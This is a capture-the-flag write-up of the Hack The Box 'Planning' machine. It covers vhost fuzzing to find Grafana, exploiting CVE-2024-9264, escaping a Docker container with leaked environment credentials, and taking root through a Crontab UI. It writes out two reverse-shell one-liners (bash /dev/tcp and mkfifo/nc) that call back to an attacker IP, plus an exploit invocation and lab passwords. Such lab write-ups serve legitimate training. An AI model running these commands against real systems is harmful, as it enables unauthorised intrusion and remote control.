#box #RCE #docker

Planning is a good example of a machine hiding a quite hostile vhost. In fact, this machine can be hacked by using a bigger list of subdomains and by targeting the VHOST of the target machine until a `grafana.planning.htb` is found. Once there, we can leverage a CVE to get on the target machine.

# Nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:03 EDT
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.049s latency).
Not shown: 822 closed tcp ports (reset), 176 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds
```

## 80 - HTTP

We jump on port 80 to understand what's there, discovering a portal of education. We start different [[FFuF#VHost Fuzzing|enumerations]] until we discover after some try a new VHost:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u http://planning.htb/ -H 'Host: FUZZ.planning.htb' -fc 301 -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/combined_subdomains.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 65ms]
```

We then add `grafana.planning.htb` to our `/etc/hosts` and proceed with the discovery

### grafana.planning.htb

On the new vhost we discover a grafana's instance hosted, we can authenticate with the credentials specified on HTB: `admin:0D5oT70Fq13EvB5r`. By enumerating its version and googling we discover that version suffers from a RCE vulnerability, we then inject a reverse shell that we'll promptly catch on port 4444:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.16.60/4444 0>&1"' http://grafana.planning.htb/
```

We land on a machine, as root. However, we discover it's a docker container by landing on `/` and doing `ls -la`, since a `.dockerenv` is present and, moreover, the name of the machine feels randomly generated, as the ID of a Docker container.

## Exiting the docker container

To exit the container, we discover a credential in the `env` variables of the container. Precisely: `enzo:RioTecRANDEntANT!`. We opt then to authenticate in SSH to the target machine, obtaining the user of the machine:

```bash
ssh enzo@planning.htb
```

## Privilege Escalation

Once in SSH, we discover the presence of more services that are not exposed externally. By basically cURL inside SSH we discover that something is hiding on port 8000. We opt for a SSH Port Forwarding to find out what's in there. We point our port 8000 to the target's port 8000:

```bash
ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
```

Once done, we can finally reach on our browser the port 8000 of the target by simply navigating to `localhost:8000`.
Inside of it, we find a Crontab UI web page. It's executing a grafana backup and a cleanup pointing to the `/root` folder. We're then assuming this is running as `root`.

We then plan to get a reverse shell on our end by crafting a bash script that consists in a reverse shell to us:


```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.60 4445 >/tmp/f
```

Obtaining a reverse shell:

```bash
root@planning:~# ls -la
ls -la
total 40
drwx------  6 root root 4096 Aug 23 17:04 .
drwxr-xr-x 22 root root 4096 Apr  3 14:40 ..
lrwxrwxrwx  1 root root    9 Feb 28 20:41 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 Apr  1 11:08 .cache
-rw-------  1 root root   20 Apr  3 15:18 .lesshst
drwxr-xr-x  4 root root 4096 Feb 28 19:01 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   33 Aug 23 17:04 root.txt
drwxr-xr-x  2 root root 4096 Apr  3 12:54 scripts
drwx------  2 root root 4096 Feb 28 16:22 .ssh
```